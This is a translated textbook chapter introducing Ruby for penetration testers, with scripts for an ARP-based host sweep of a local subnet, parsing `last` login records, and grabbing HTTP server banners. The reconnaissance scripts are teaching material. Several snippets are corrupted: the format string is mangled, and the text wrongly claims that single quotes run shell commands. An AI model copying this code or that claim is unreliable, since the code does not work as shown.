  \n# 第 4 章\n\n# Ruby 简介\n\n## 本章内容：\n\n• Ruby 的适用场景\n\n• Ruby 基础\n\n• 使用 Ruby 构建类\n\
  \n• 文件操作\n\n• 数据库基础\n\n• 网络操作\n\n• 综合运用\n\nRuby 是一种面向对象的脚本语言，其语法与 Python 类似。它是一种较新的语言，于\
  \ 1995 年公开发布，但直到 21 世纪中期才逐渐流行起来。Ruby 结合了 Perl、Ada 和 Lisp 等语言的概念，使得对于已经熟悉其他流行脚本语言的人来说，学习曲线较短。它足够灵活，允许在格式化代码时进行艺术性诠释，并且能够创建功能强大且美观的代码。Ruby\
  \ 能够将对象串联起来，创建复杂的单行代码。它还提供了多种处理复杂任务的方法，因此解决问题的方式往往不止一种。\n\n对于渗透测试人员来说，Ruby 在网络通信、协议操作和面向对象数据库访问方面表现出色。本章涵盖\
  \ Ruby 的基础知识，深入探讨数据库概念和网络通信，并最终在 Ruby 中创建一个二进制文件传输协议。\n\n## Ruby 的适用场景\n\n在 Ruby\
  \ 中，类之间的转换比许多其他语言更容易，这使得 Ruby 在执行复杂的二进制协议解析时非常方便。类之间的转换允许我们将二进制数据或文本字符串转换为整数，并对数据进行操作。一旦我们完成操作，Ruby\
  \ 可以轻松地将数据转换回二进制数据或字符串，而无需进行复杂的操作。\n\nRuby 扩展类的能力使我们能够创建更多的转换类型。通过扩展类，我们可以快速获取 Ruby\
  \ 在类中提供的类方法，并添加我们自己的方法。扩展类的能力允许我们创建额外的辅助工具，这些工具可以完成从类到类的转换，一直到创建像圣诞树一样格式化打印输出的新函数。\n\
  \nRuby 扩展和类之间转换的能力是它在安全社区中如此受欢迎的主要原因之一。像 Metasploit 框架[[1]](#CHP004.html_BIB1)这样的项目利用这一特性来分层多个类，并使用称为\
  \ Mixin 的概念[[2]](#CHP004.html_BIB2)来扩展类。有了这些特性，创建可重用代码变得容易得多。\n\nRuby 还拥有一个易于使用的线程应用程序接口（API），允许我们创建可以在任何能运行\
  \ Ruby 的平台上运行的线程应用程序——甚至包括像 DOS 这样的单用户操作系统。这有助于创建不同类型的服务器，包括 Web 服务器，这些服务器可以在中间人攻击中利用，甚至包括像简单文件传输协议（TFTP）服务器或\
  \ FTP 服务器这样的基本协议服务器。\n\n## Ruby 基础\n\nRuby 有两种执行脚本的方式：一个称为`irb`（交互式 Ruby 的缩写）的交互式\
  \ shell，以及 Ruby 解释器本身，通常称为`ruby`。为了感受 Ruby，让我们执行一个快速脚本，利用其在不同数据类型之间轻松转换的能力。在这个例子中，我们将使用交互式\
  \ Ruby shell `irb`。在下面的代码中，我们包含了一个标志来使用简单提示符，以免使文本杂乱。然而，这完全是可选的。\n\n```\nroot@bt:\
  \ # irb –prompt-mode simple\n\n#Create a string containing A\n\n>> char = \"A\"\n\
  \n=> \"A\"\n\n# Unpack the character string as an unsigned Integer, Unpack returns\
  \ an # array\n\n>> char.unpack(\"C\")\n\n=> [65]\n\n# The array class has a method\
  \ called first, which takes the first # object, in this case, an Integer class containing\
  \ the value 65\n\n>> char.unpack(\"C\").first\n\n=> 65\n\n# The integer class has\
  \ a method to_s to turn a number into a string. We # can pass a value\n\n# into\
  \ the to_s function to dictate the base of the integer. In this # case, we use 16\
  \ for hex\n\n>> char.unpack(\"C\").first.to_s(16)\n\n=> \"41\"\n\n# We now know\
  \ that A is 0x41 in Hex, but we can also figure out binary by # specifying a base\
  \ of 2\n\n>> char.unpack(\"C\").first.to_s(2)\n\n=> \"1000001\"\n\n# Now that we\
  \ know what that value is in binary, let’s convert that to an # integer\n\n>> char.unpack(\"\
  C\").first.to_s(2).to_i\n\n=> 1000001\n\n# With the string format operator we can\
  \ print the value out with 0 pad # to get the full\n\n# binary value\n\n>> \"%08d\"\
  \ % char.unpack(\"C\").first.to_s(2).to_i\n\n=> \"01000001\"\n```\n\n在我们的代码示例中，我们创建了一个只包含“A”的字符串。字符串对象拥有丰富的方法。其中一个是`unpack`方法，它可以以不同方式解码我们的字符串。`C`格式告诉它将字符串解包为\
  \ 8 位字符。`unpack`的输出返回一个包含解包值的数组——在本例中，是“A”的十进制 ASCII 值，用方括号中的数字 65 表示。\n\n提示\n\n\
  字符串的`unpack`方法对于将我们读取为字符串的数据转换回其原始形式非常有用。要了解更多，请访问`String`类参考文档 [www.ruby-doc.org/core/classes/String.html](http://www.ruby-doc.org/core/classes/String.html)。\n\
  \nRuby 的一个流行特性是能够顺序使用方法。因为在 Ruby 中一切都是类，我们可以将一个方法视为它返回的类。这意味着如果我们有一个像`\"5\".to_i`这样的语句，我们知道它将返回一个`Integer`类。因此，我们可以将整个东西视为一个`Integer`。`Integer`类有一个`to_s`方法将其转换回字符串。所以我们的最终语句将是`\"\
  5\".to_i.to_s`，将其变回字符串。\n\n\n\n在我们的代码示例中，`unpack` 返回一个数组。因此，我们可以使用数组类的 `first` 方法来获取数组中的第一个（本例中也是唯一一个）值。这会得到一个值为\
  \ 65 的 `Integer` 类对象。现在，我们可以继续将 `first` 的输出视为 `Integer`，并使用 `to_s` 方法将该整数转换为该整数的字符串表示形式。\n\
  \n`to_s` 方法有一个其他语言不具备的便捷特性：能够指定转换时整数的基数。这使我们能够转换为十六进制的基 16，或二进制的基 2。我们可以利用这一点来找出“A”在十六进制和二进制中分别是什么。通常，在处理二进制时，我们希望以\
  \ 8 位块的形式处理二进制数据，以便查看整个字节的样子。如果我们要将二进制数据拼接在一起，显示整个字节将使我们能够做到这一点，而不会混淆一个字节的结束和下一个字节的开始。我们可以编写一个函数来实现这一点，或者让\
  \ Ruby 来帮助我们。\n\n我们可以使用 Ruby 的字符串格式化功能来打印我们的十进制数，并用零填充我们的值以达到八位字符。要格式化 Ruby 字符串，我们使用格式字符串变量——在本例中为\
  \ `%08d`。这表示我们将有一个八位的数字，并用零填充额外的空间。因为我们需要一个整数来执行此操作，所以我们需要使用二进制字符串上的 `to_i` 方法将我们的值转换回整数。然后，我们将把它作为值传递给我们的格式字符串。现在我们知道如何在不同类之间来回转换，我们可以在未来的脚本中使用这些方法。\n\
  \n### 变量\n\nRuby 在我们已经讨论过的变量类型基础上增加了额外的变量类型。除了整数、数组和哈希之外，Ruby 还提供了两种新类型：符号和常量。与\
  \ Python 非常相似，每种 Ruby 变量类型都是一个类，并且具有支持每种类型的方法。\n\n#### 符号\n\n在 Ruby 中构造数组和哈希的语法与\
  \ Python 和 Perl 不同，但概念足够相似。然而，Ruby 的一个显著区别在于哈希键的处理方式。在 Ruby 中，如果我们使用字符串作为哈希键，Ruby\
  \ 每次使用时都会生成一个新实例。这会为每个实例消耗额外的内存。对于大型哈希，我们应该对用作哈希键的字符串使用符号表示法。这会使用相同的实例，而不是每次使用字符串时都分配一个新实例，从而节省内存。我们可以通过查看\
  \ `object_id` 方法来查看每个实例。\n\n```\n>> myList = [{\"name\" => \"Ruby\"}, {\"name\"\
  \ => \"RuleZ\"}]\n=> [{\"name\"=>\"Ruby\"}, {\"name\"=>\"RuleZ\"}]\n>> myList.each\
  \ { |i| print i.keys.first.object_id.to_s + \"\\n\"}\n1632260\n1632220\n=> [{\"\
  name\"=>\"Ruby\"}, {\"name\"=>\"RuleZ\"}]\n```\n\n我们创建了一个哈希数组，每个哈希的键值都是 `name`。我们创建了一个\
  \ for 循环来遍历数组并打印每个类的对象 ID。用英语来说：对于 `myList` 中的每个元素（`i`），打印每个元素（`i`）的第一个对象的键的对象 ID。该值被转换为字符串，以便我们可以在打印语句中使用它。如不同的对象\
  \ ID 所示，我们可以看到每个 `name` 实例都有不同的对象 ID。如果我们创建一个包含 1000 个此类示例的哈希，我们将不必要地消耗额外的内存。\n\n\
  ```\n>> myList = [{:name => \"Ruby\"} ,{ :name => \"RuleZ\"}]\n=> [{:name=>\"Ruby\"\
  }, {:name=>\"RuleZ\"}]\n>> myList.each { |i| print i.keys.object_id.to_s + \"\\\
  n\" }\n1615710\n1615710\n=> [{:name=>\"Ruby\"}, {:name=>\"RuleZ\"}]\n```\n\n这里，我们使用符号来定义键名。符号以\
  \ `:` 符号开头，不需要任何引号。这次，当我们遍历键时，我们看到两次使用的 `:name` 键都具有相同的对象 ID。这表明，通过使用符号，我们使用的是同一个对象实例，因此使用了更少的内存。从视觉上看，符号类还允许轻松识别键和值，并且是保持编程实践的良好约定。\n\
  \n#### 常量、整数和浮点数\n\n我们现在已经看到了数组、哈希、符号和字符串。让我们来看看常量、整数和浮点数。\n\n与 Python 一样，Ruby 对整数和浮点数的处理方式不同。因此，我们在第\
  \ 2 章中与 Python 一起使用的许多整数除法技巧仍然有效。在我们的下一个代码示例中，我们首先将变量 `a` 和 `b` 的值设置为整数值。当我们尝试对这些值进行除法时，我们最终会得到一个整数形式的四舍五入结果。为了以浮点数形式得到结果，我们必须使用整数类的\
  \ `to_f` 方法将每个数字转换为浮点数。我们可以将该数字赋值给我们的 `MyConstant` 变量。\n\n```\n>> a = 5\n=> 5\n\
  >> b = 3\n=> 3\n>> a/b\n=> 1\n>> MyConstant = a.to_f/b.to_f\n=> 1.66666666666667\n\
  >> MyConstant = 5\n(irb):51: warning: already initialized constant MyConstant\n\
  => 5\n```\n\n`Constant` 类允许我们创建值不应改变的变量。当我们想要定义需要保护的值时，例如在进行数据包操作时用户数据报协议（UDP）头的长度，这非常有用。常量与其他变量类型有所区别。它们必须以大写字母开头。\n\
  \n**注意**：即使更改常量会生成警告，请注意 `MyConstant` 的值*确实*从原始值变为了 5。可以更改常量的值，但这样做会生成一个警告，表明发生了某些情况。\n\
  \n### 数组和哈希\n\n在前面的部分中，我们看到了数组和哈希的实际应用。但这些结构非常重要，在继续之前我们应该更深入地研究一下。\n\nRuby 中的数组是从索引\
  \ 0 开始的值或对象的索引列表。与所有 Ruby 对象一样，数组是具有自己方法的类。其中许多方法会让人想起 Python 的 `List` 对象。这些方法包括用于从数组中添加和删除值的\
  \ `push` 和 `pop`，以及追加运算符 `<<`。\n\n让我们来看看哈希。注意我们如何将符号与哈希一起使用。\n\n在渗透测试期间，我们偶尔会遇到本地网络上的主机阻止互联网控制消息协议（ICMP）流量的情况。我们想要找出哪些主机在线，哪些不在线，但使用诸如\
  \ Nmap 之类的端口扫描器进行网络扫描是行不通的。在扫描之前，我们如何轻松识别哪些主机在线？大多数主机即使阻止所有端口，也会响应地址解析协议（ARP）请求。默认情况下，Ruby\
  \ 没有附带 ARP 模块，因此让我们利用一个网络技巧来收集我们的 ARP 条目。\n\n```\n#!/usr/bin/ruby\n\nrequire ’socket’\n\
  \ns = UDPSocket.new\n```\n\n此脚本首先使用 `require` 关键字加载 socket 库。接下来，我们使用 `UDPSocket`\
  \ 类创建一个 UDP socket，并使用 `new` 运算符实例化该类的一个新实例。我们将使用 `UDPSocket` 向每个主机发送一个数据包。我们并不真正期望收到返回数据包，但我们确实希望操作系统层为该\
  \ IP 地址发送一个 ARP 请求。如果主机在线，ARP 条目将被添加到操作系统的 ARP 缓存中，并分配一个 IP 地址。通过浏览此 ARP 缓存，我们可以轻松判断哪些主机在线。\n\
  \n```\n254.times do |i|\n   next if i == 0\n   s.send(\"test\", 0, \"192.168.1.\"\
  \ + i.to_s, 53)\nend\n```\n\n\n\n\n为了枚举 IP 空间，我们使用`Fixnum`类的`times`操作符：该类用于尚未赋值给变量的数字。`times`操作符从\
  \ 0 迭代到 254，并将当前值赋给我们的`i`变量。如果`i`等于 0，我们跳过它，因为我们只想要子网中可用的 IP 地址。在后续迭代中，我们将`i`追加到子网值`192.168.1`，并向该\
  \ IP 地址的 53 端口发送一个 UDP 数据包。我们不需要 53 端口是开放的。请注意，这个示例专门针对具有 255 个 IP 的子网。在实际使用此脚本时，需要针对其他子网范围进行修改。\n\
  \n当我们发送 UDP 数据包时，系统必须首先发送一个 ARP 请求，将 IP 转换为 MAC 地址。我们实际上并不关心 UDP 数据包。我们感兴趣的是 ARP\
  \ 请求的结果。因此，我们不需要等待任何返回，只需发送数据包，然后查看哪些主机已被添加到机器的 ARP 缓存中。\n\n提示\n\n由于 ARP 是一种仅能在当前子网中工作的协议，因此这种脚本方法仅适用于处理本地网络子网中可访问的主机。\n\
  \n一旦 UDP 数据包发送完毕，我们利用 proc 文件系统直接访问系统的 ARP 表。\n\n注意\n\n由于我们使用的是 proc 文件系统，此脚本仅在\
  \ UNIX 系统上运行时才有效。\n\n我们以读取模式打开`/proc/net/arp`虚拟文件，然后将信息读入我们的`data`数组。\n\n```\nf\
  \ = File.open(\"/proc/net/arp\",'r')\ndata = f.read.split(\"\\n\")\nup_hosts = []\n\
  data.each do |line|\n   entry = line.split(/\\s+/)\n   next if entry[3] == \"00:00:00:00:00:00\"\
  \n   next if entry[0] == \"IP\"\n   up_hosts << {:ip => entry[0], :mac => entry[3]}\n\
  end\n```\n\n由于我们已经根据换行符对输出进行了拆分，因此会得到一个数组，每个值都是一个 ARP 条目。我们使用`[]`数组语法创建一个名为`up_hosts`的新空数组。我们遍历每一行，每次将\
  \ ARP 缓存中的行赋值给`line`变量。我们使用正则表达式拆分将行拆分为单个实体，该正则表达式使用了我们在第 3 章中为 Perl 学习的相同正则表达式语法。\n\
  \n接下来，我们创建两个额外的检查。当我们在脚本外部通过输入`cat /proc/net/arp`查看该文件时，会发现有一个标题行。我们需要去掉以`IP`开头的行，以及任何具有默认值`00:00:00:00:00:00`的空白\
  \ ARP 条目。我们在这些行上使用`next`关键字，并配合内联`if`语句，如果行中的第一个字段是这些值之一，则跳转到下一次迭代。最后，如果我们有一个有效的\
  \ ARP 条目，我们使用`{}`语法创建一个哈希，并使用`:ip`和`:mac`符号作为我们解析出的值的键。我们使用`=>`操作符为每个键赋值。我们需要的两个字段是\
  \ IP 地址（字段中的第一个元素）和 MAC 地址（第四个元素）。由于数组从索引 0 开始，我们从 0 开始计数，得到数组字段 0 和 3。现在我们有了哈希，我们使用`<<`追加语法将其追加到`up_hosts`数组的末尾，从而使我们的哈希成为该数组的最后一个元素。\n\
  \n```\nprint \"Active network hosts\\n\"\nprint \"%-12s\\t%s\\n\" % [\"IP Addr\"\
  \ , \"MAC Address\"]\n```\n\n现在我们有了一个包含通过 ARP 解析找到的主机的哈希数组。我们需要以易于查看的格式打印它们。我们首先使用`print`格式字符串打印标题。我们使用`%s`表示字符串，`%-12s`表示一个左对齐的\
  \ 12 字符字符串。创建好格式字符串后，我们需要传入两个要打印的字符串。我们在格式字符串后面使用`%`符号，告诉 Ruby 下一个数组将包含我们的数据。我们使用`[]`创建一个数组，并使用两个标题字符串作为每个元素。\n\
  \n```\nup_hosts.each do |host|\n   print \"%-12s\\t%s\\n\" % [host[:ip], host[:mac]]\n\
  end\n```\n\n现在标题已经就位，我们遍历`up_hosts`数组，并将每个哈希赋值给`host`变量。我们再次使用格式字符串，这次创建一个包含两个哈希值的数组。要访问哈希值，我们使用与访问数组元素相同的语法，但不是在`[]`中放入整数，而是放入我们的符号名称。\n\
  \n我们将脚本命名为`arp.rb`，并使用`ruby`二进制文件运行它。图 4.1 展示了输出可能的样子。不同的网络会有不同的数据，但这说明了如何在 BackTrack\
  \ 中运行我们的脚本，并展示了按我们预期格式化的输出。\n\n![image](img/F000047f04-01-9781597497299.jpg)\n\n\
  图 4.1 执行 arp.rb 脚本\n\n以下是完整源代码：\n\n```\n#!/usr/bin/ruby\nrequire 'socket'\ns = UDPSocket.new\n\
  254.times do |i|\n   next if i == 0\n   s.send(\"test\", 0, \"192.168.1.\" + i.to_s,\
  \ 53)\nend\nf = File.open(\"/proc/net/arp\",'r')\ndata = f.read.split(\"\\n\")\n\
  up_hosts = []\ndata.each do |line|\n   entry = line.split(/\\s+/)\n   next if entry[3]\
  \ == \"00:00:00:00:00:00\"\n   next if entry[0] == \"IP\"\n   up_hosts << { :ip\
  \ => entry[0], :mac => entry[3]}\nend\nprint \"Active network hosts\\n\"\nprint\
  \ \"%-12s\\t%s\\n\" % [\"IP Addr\" , \"MAC Address\"]\nup_hosts.each do |host|\n\
  \   print \"%-12s\\t%s\\n\" % [host[:ip], host[:mac]]\nend\n```\n\n### 控制语句\n\n\
  之前，我们使用了一些基本的`if`语句和`for`循环。Ruby 的条件语句与我们之前看到的非常相似。Python 和 Perl 的条件操作符在 Ruby 中工作方式相同。让我们看一个例子。\n\
  \n```\n#!/usr/bin/ruby\ndata = 'last'.split(\"\\n\")\n```\n\n我们首先运行`last`命令。`last`命令列出系统的最后登录记录。我们将`last`命令放在单引号中，以告诉\
  \ Ruby 我们希望在操作系统内运行该命令，然后将标准输出返回给应用程序。执行返回一个字符串，我们根据换行符进行拆分，并将其赋值给`data`数组。\n\n\
  ```\nusers = []\nhosts = []\ndata.each do |l|\n   if l == \"\"\n     next\n   elsif\
  \ l.start_with? \"reboot\"\n     next\n   elsif l.start_with? \"wtmp\"\n     next\n\
  \   else\n     l.rstrip!\n     users << l[0,8].rstrip\n     hosts << l[17,16].rstrip.lstrip\n\
  \   end\nend\n```\n\n接下来，我们创建两个空数组，用于存储通过`last`命令发现的唯一用户和主机。我们使用`for`循环遍历`last`输出的每一行，并将每个项赋值给`l`变量。然后我们使用`if/elsif/else`条件块来检查我们想要忽略的不同值。如果行为空，或者行以`reboot`或`wtmp`开头，我们想要跳过它；否则，我们对其进行处理。这些检查是\
  \ Ruby 中关于对象提问语法的好例子。问号是一个布尔测试，根据测试的值返回`true`或`false`。在这种情况下，我们判断行是否以某些值开头，如果是，则跳过它。\n\
  \n在每个`elsif`之后，我们进入默认的`else`语句，在其中进行最终处理。我们首先要去掉尾随空格。`String`类的`rstrip`方法会移除末尾的空白字符。通常，`rstrip`返回一个去掉空格的新字符串。但在这里，我们注意到行末尾的`!`标记。对于某些方法，我们可能希望数据被原地修改。惯例是在方法名后添加`!`标记，表示它支持原地修改，对于支持此功能的方法，我们可以通过添加`!`来避免创建另一个对象。\n\
  \n\n\n\n然后我们利用操作字符串的能力，使用与数组相同的语法，从字符串中提取特定字段。首先，我们想要字符串的前八个字符。我们取`line`，让它从字符 0\
  \ 开始，取前八个字符，并用这八个字符创建一个新字符串。然后我们取返回的字符串，对其运行`rstrip`，并将该值附加到我们的`users`数组中。我们对`hosts`字段做同样的事情；只是我们还想去掉前面的空格。所以我们额外使用`lstrip`来去掉左侧的空格。\n\
  \n```\nusers.uniq!\nhosts.uniq!\n```\n\n一旦我们的循环结束，我们将获得所有登录到我们机器的用户名和主机名。由于我们不想重复看到每个名字（我们只想提取用户\
  \ ID），我们将使用数组的`uniq`函数来去除重复项。注意使用`!`来就地修改每个数组。\n\n既然我们已经看到了一个`for`循环，让我们看看另外两种类型的循环。`for`循环在接下来的两种情况下都可以工作。但我们想看看每种循环。\n\
  \n```\nuntil users.empty?\n   print \"User: %s\\n\" % users.pop\nend\n```\n\n我们从`until`循环开始，它会一直持续直到条件返回真。在这种情况下，我们将在循环中一次移除一个元素，并一直运行直到数组为空。每次迭代，我们将从数组中弹出一个元素，然后打印它。\n\
  \n```\nwhile not hosts.empty?\n   print \"Host:%s\\n\" % hosts.pop\nend\n```\n\n\
  接下来，我们将使用`while`循环，在数组不为空时循环，并以这种方式打印我们的主机。这两个循环在功能上是等价的，但我们可以看到方法上的差异。选择哪一个只是个人喜好和审美问题。当我们运行应用程序时，应该会看到类似于图\
  \ 4.2 的输出。\n\n![image](img/F000047f04-02-9781597497299.jpg)\n\n图 4.2 上次解析 Ruby 脚本的输出\n\
  \n以下是完整代码：\n\n```ruby\n#!/usr/bin/ruby\n\ndata = 'last'.split(\"\\n\")\n\nusers\
  \ = []\n\nhosts = []\n\ndata.each do |l|\n\n   if l == \"\"\n\n     next\n\n   elsif\
  \ l.start_with? \"reboot\"\n\n     next\n\n   elsif l.start_with? \"wtmp\"\n\n \
  \    next\n\n   else\n\n     l.rstrip!\n\n     users << l[0,8].rstrip\n\n     hosts\
  \ << l[17,16].rstrip.lstrip\n\n   end\n\nend\n\nusers.uniq!\n\nhosts.uniq!\n\nuntil\
  \ users.empty?\n\n   print \"User: %s\\n\" % users.pop\n\nend\n\nwhile not hosts.empty?\n\
  \n   print \"Host : %s\\n\" % hosts.pop\n\nend\n```\n\n### 函数\n\n我们可能想要重复使用的代码应该放入函数中，以便将来更容易添加到程序中。让我们看一个实际例子。假设我们有一些\
  \ Web 服务器，我们想了解更多关于它们的信息。我们可以查看服务器头部和`x-powered-by`头部。这些可能会告诉我们 Web 服务器运行的是什么服务器软件，以及服务器运行的其他附加组件，如\
  \ PHP、Python 或[ASP.NET](http://ASP.NET)。虽然服务器可能会隐藏这些值，但我们经常会遇到它们，所以让我们编写一个基本函数来从主机获取它们。\n\
  \n```ruby\nrequire 'net/http'\n\ndef getHeader(host,port = nil)\n\n   port = port\
  \ || 80\n```\n\n我们使用`require`关键字来包含我们的辅助模块`net/http`。如果无法包含它，我们希望程序失败。接下来，我们使用`def`关键字后跟函数名来定义函数。我们的函数名为`getHeader`，将接受两个参数。第一个参数是一个字符串，包含我们要连接的主机。第二个参数是端口，是可选的。这允许我们只在要连接非标准端口时才指定端口。为了确保我们有一个有效的端口，下一行将端口设置为\
  \ 80（如果没有给出其他端口）。\n\n```ruby\n   Net::HTTP.start(host.to_s,port) do |http|\n\n \
  \     resp = http.head('/')\n\n      return [resp['server'].to_s ,resp['x-powered-by'].to_s]\n\
  \n   end\n\n   return [nil,nil]\n\nend\n```\n\n接下来，我们使用一种称为块的 Ruby 技术创建超文本传输协议（HTTP）对象的新实例。缩进定义了块的开始和结束。我们不必在这里使用循环，但通过使用这个块，我们将返回值赋给`http`变量。当块结束时，`Net::HTTP`类将关闭套接字并为我们处理清理工作。我们的`http`变量保存了\
  \ HTTP 对象，它允许我们向 Web 服务器发出 HTTP 命令。我们使用`head`方法向 Web 服务器发送 HTTP HEAD 请求，使用`/`作为上下文。这将返回信息，包括日期、Web\
  \ 服务器类型、请求参数，以及经常出现的`x-powered-by`头部，它指示了安装的附加模块。我们最感兴趣的两部分数据是服务器信息和服务器的`x-powered-by`信息，我们将它们提取为一个两部分数组。\n\
  \n最后，我们关闭循环，让 HTTP 对象为我们清理。如果由于某种原因请求失败，我们添加一个回退，返回一个包含两个`nil`值的数组。这确保了函数返回信息的一致性。让我们让函数解析从命令行传递的选项，并使用这些变量来调用我们的函数。\n\
  \n```ruby\nif ARGV.size <= 0 || ARGV.size > 2\n\n   print \"Usage: #{$0} Host [Port]\\\
  n\"\n\n   exit\n\nend\n\nserver, mods = getHeader(ARGV[0],ARGV[1])\n\nprint \"Server\
  \ #{server} (#{mods})\\n\"\n```\n\n提示\n\n注意`ARGV`处理上的差异。在许多语言中，`ARGV`的第一个数组元素是程序名本身。在\
  \ Ruby 中，`ARGV`的第一个元素是第一个选项。要引用程序名本身，我们必须使用`$0`。\n\n如果`ARGV`参数数量无效，我们会显示错误消息并退出。我们在错误字符串中使用的表示法允许我们有效地将代码或变量嵌入到字符串中。通过将代码或变量包裹在`#{}`符号中，我们告诉\
  \ Ruby 计算符号内的代码并将该值插入到字符串中。在这种情况下，我们通过插入`$0`来包含被调用的脚本名称。\n\n接下来，我们使用函数`getHeader`连接到远程服务器，获取头部信息，并将服务器类型和`x-powered-by`信息返回到两个变量：`server`和`mods`。然后我们将它们打印到屏幕上。我们将脚本保存为`head.rb`，并将脚本的权限设置为\
  \ 755。图 4.3 显示了脚本针对[syngress.com](http://syngress.com)运行时的输出。这里我们可以看到服务器类型是 Apache，并且该服务器有可能运行\
  \ Ruby on Rails 代码。\n\n![image](img/F000047f04-03-9781597497299.jpg)\n\n图 4.3 针对[syngress.com](http://syngress.com)运行`head.rb`\n\
  \n以下是完整代码：\n\n```ruby\nrequire 'net/http'\n\ndef getHeader(host,port = nil)\n\n\
  \   port = port || 80\n\n   Net::HTTP.start(host.to_s,port) do |http|\n\n     resp\
  \ = http.head('/')\n\n     return [resp['server'].to_s ,resp['x-powered-by'].to_s]\n\
  \n   end\n\n   return [nil,nil]\n\nend\n\nif ARGV.size <= 0 || ARGV.size > 2\n\n\
  \   print \"Usage: #{$0} Host [Port]\\n\"\n\n   exit\n\nend\n\nserver, mods = getHeader(ARGV[0],ARGV[1])\n\
  \nprint \"Server #{server} (#{mods})\\n\"\n```\n\n## 使用 Ruby 构建类\n\n类允许我们将数据与有助于操作、增强和报告这些数据的方法分组。在\
  \ Ruby 中，类可以相互构建；它们被设计为可扩展和增强，以创建用于特定目的的自定义类。这允许我们构建一个基本的套接字服务器类，并扩展它以让不同的协议工作。我们可以利用套接字服务器的基本代码，并为每个协议编写更少的代码。通过这样做，当我们在基类中发现错误时，我们不必复制粘贴来传播代码以定义各个协议。\n\
  \n让我们将在第 2 章中创建的头部函数转换为一个类。\n\n### 构建一个类\n\n\n\n我们使用 `class` 关键字定义一个类。一旦定义并命名了类，就必须决定是否需要\
  \ `initialize` 方法。`initialize` 方法处理创建类时传递给类的选项，还处理类创建时可能需要的任何其他设置。当我们使用 `new` 运算符时，`initialize`\
  \ 会被自动调用，因此我们不会直接调用它。如果不需要任何设置，我们可以让 Ruby 替我们处理。`initialize` 函数会自动包含，并使用 Ruby 默认值，因此我们不必重复编写那段代码。让我们创建一个\
  \ `initialize` 方法，它将接收我们传递给 `getHeader` 函数的两个选项。\n\n```\n#!/usr/bin/ruby\n\nrequire\
  \ ’net/http’\n\nclass MyHead\n\n   def initialize(host,port = nil)\n\n     @host\
  \ = host\n\n     @port = port.to_i || 80\n\n   end\n```\n\n我们创建了一个名为 `MyHead` 的新类，并在\
  \ `initialize` 方法中列出了两个选项：`host` 和 `port`。我们将它们赋值给 `@host` 和 `@port`。`@` 符号将这些变量指定为实例变量。这使我们能够自由使用和更新这些变量，同时只影响类的特定实例。\n\
  \n现在，我们将 `getHeader` 函数转换为类的一个方法。该方法看起来与之前的函数非常相似，并将使用 `def` 关键字定义。`getHeader` 不需要任何参数，因为它们已经传递给了\
  \ `initialize` 方法。让我们看看转换后的方法。\n\n```\n  def getHeader()\n\n    Net::HTTP.start(@host.to_s,@port)\
  \ do |http|\n\n      resp = http.head(’/’)\n\n      return [resp[’server’].to_s\
  \ ,resp[’x-powered-by’].to_s]\n\n    end\n\n    return [nil,nil]\n\n  end\n```\n\
  \n注意，在 `getHeader` 代码中，我们使用了实例变量 `@host` 和 `@port`，这样就不需要传递选项了。该方法与原始函数之间唯一的区别是，该方法被封装在\
  \ `Class` 关键字中。现在，我们已经将函数转换为类，必须更新代码，创建 `MyHead` 类的新实例，然后调用该实例的 `getHeader` 方法以获取数据。最终代码展示了完整的类以及将函数转换为类所需做的更改。\n\
  \n```\n#!/usr/bin/ruby\n\nrequire ’net/http’\n\nclass MyHead\n\n   def initialize(host,port\
  \ = nil)\n\n     @host = host\n\n     @port = port.to_i || 80\n\n   end\n\n   def\
  \ getHeader()\n\n     Net::HTTP.start(@host.to_s,@port) do |http|\n\n       resp\
  \ = http.head(’/’)\n\n       return [resp[’server’].to_s ,resp[’x-powered-by’].to_s]\n\
  \n     end\n\n     return [nil,nil]\n\n   end\n\nend\n\nif ARGV.size <= 0 || ARGV.size\
  \ > 2\n\n   print \"Usage: #{$0} Host [Port]\\n\"\n\n   exit\n\nend\n\nhead = MyHead.new(ARGV[0],ARGV[1])\n\
  \nserver, mods = head.getHeader()\n\nprint \"Server #{server} (#{mods})\\n\"\n```\n\
  \n### 扩展类\n\n能够扩展类使我们能够在前人工作的基础上进行构建。如果我们有一个类能完成大部分所需功能，再加上一两个函数就很方便，那么我们可以轻松地将这些函数添加到自己的类版本中。为了尝试这一点，我们将创建一个类，它接受一个字符串并将其转换为十六进制等价形式。然后，我们将创建一个派生类，它拥有第一个类的功能，并且能够将十六进制转换回原始字符串。\n\
  \n我们将初始类命名为 `HexMaker`，方法命名为 `str_to_h`。该方法将使用字符串的 `unpack` 方法将字符串转换为十六进制字符，并返回字符串值。\n\
  \n```\n#!/usr/bin/ruby\n\nclass HexMaker\n\n   def str_to_h(str)\n\n     str.unpack(\"\
  H^∗\").first\n\n   end\n\nend\n```\n\n接下来，我们将创建名为 `MyHexMaker` 的派生类，并使用 `<` 运算符包含\
  \ `HexMaker` 类。`<` 运算符告诉 Ruby 将第一个类中的所有代码包含到新类中。然后，我们将创建一个 `h_to_s` 方法，将字符串从十六进制转换回原始字符串。为此，我们在包含字符串的数组上使用数组的\
  \ `pack` 方法。请注意，这两个方法都没有显式返回数据，但通过在方法末尾仅保留值，该方法会为我们返回该值。让我们看看整个脚本，并研究输出结果。\n\n```\n\
  #!/usr/bin/ruby\n\nclass HexMaker\n\n   def str_to_h(str)\n\n     str.unpack(\"\
  H^∗\").first\n\n   end\n\nend\n\nclass MyHexMaker < HexMaker\n\n   def h_to_s(hex)\n\
  \n     i = 0\n\n     [hex].pack(\"H^∗\")\n\n   end\n\nend\n\ntst = HexMaker.new.str_to_h(\"\
  AAAA\")\n\nprint \"Converted string #{tst}\\n\"\n\ntst = MyHexMaker.new.str_to_h(\"\
  AAAA\")\n\nprint \"Original String: #{MyHexMaker.new.h_to_s(tst)}\\n\"\n```\n\n\
  我们创建了一个 `HexMaker` 的新实例，将 `str_to_h` 的输出赋值给 `tst` 变量，并打印出来。为了证明 `MyHexMaker` 类具有相同的功能，我们将执行相同的操作。现在，`tst`\
  \ 中保存了十六进制值，我们将使用 `h_to_s` 将其转换回来。在图 4.4 中，我们看到该脚本将同时打印十六进制值和原始字符串值，表明我们已成功转换为十六进制，然后又转换回来。这个示例展示了如何获取一个类、扩展它，并保持原有功能。\n\
  \n![image](img/F000047f04-04-9781597497299.jpg)\n\n图 4.4 hex.rb 脚本的输出\n\n### 访问类数据\n\
